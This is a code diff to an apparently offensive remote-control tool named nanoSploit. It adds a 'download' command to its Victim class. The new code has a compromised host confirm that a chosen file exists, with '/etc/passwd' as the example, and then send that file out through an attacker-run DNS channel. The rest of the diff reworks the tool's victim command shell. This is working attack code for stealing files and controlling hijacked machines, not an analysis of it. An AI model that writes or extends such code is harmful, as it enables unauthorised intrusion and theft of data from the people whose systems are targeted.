@@ -15,7 +15,8 @@ class Victim:
         self.port = addr[1]
         self.commands = {
             "ping": self.__ping,
-            "shell": self.__shell
+            "shell": self.__shell,
+            "download": self.__download
         }
 
     def __ping(self) -> bool:
@@ -49,22 +50,68 @@ class Victim:
                     break
         return True
 
+    def __download(self):
+        src_path = input("Absolute source path on remote host (ex: '/etc/passwd') : ")
+        if src_path:
+            # if entered a correct file path
+
+            # Ask victim if remote file exists
+            self.conn.send(b"exists "+src_path.encode())
+            buffer = self.conn.recv()
+            if buffer:
+                if buffer == b"ok":
+                    # File exists on remote host
+
+                    filename = src_path.split("/")[-1]
+
+                    # Tell the DNS server where to write file
+                    from nanosploit.dns import dns_handler
+                    dns_handler.filename = filename
+
+                    # Tell victim to start sending file
+                    self.conn.send(b"send " + src_path.encode())
+                    print("Waiting for victim to send file...")
+
+                    # Waiting victim to finish
+                    buffer = self.conn.recv()
+
+                    # Reset DNS server
+                    dns_handler.filename = None
+
+                    if buffer:
+                        if buffer == b"ok":
+                            print(f"Successfully downloaded to '{filename}'")
+                        else:
+                            print("Error while sending file")
+                    else:
+                        # Lost victim connection
+                        return False
+                else:
+                    print("Error: file doesn't exist or is not a file")
+            else:
+                # Lost victim connection
+                return False
+        else:
+            print("Error: enter a correct file name")
+        return True
+
     def enter_shell(self) -> bool:
         while True:
             cmd: str = input(f"\033[4mnanoSploit\033[0m ({self._id}) > ")
 
             if cmd:
-                match cmd:
-                    case cmd if cmd in ("exit", "quit", "q"):
+                cmd1 = cmd.split(" ")[0]
+                match cmd1:
+                    case cmd1 if cmd1 in ("exit", "quit", "q"):
                         # Exit client selection without closing connection
                         break
                     case "close":
                         # Exit client selection and closing connection
                         self.conn.close()
                         return False
-                    case cmd if cmd in self.commands.keys():
-                        if not self.commands[cmd]():
-                            # If None then lost connection
+                    case cmd1 if cmd1 in self.commands.keys():
+                        if not self.commands[cmd1]():
+                            # If False then lost connection
                             self.conn.close()
                             return False
                     case _:
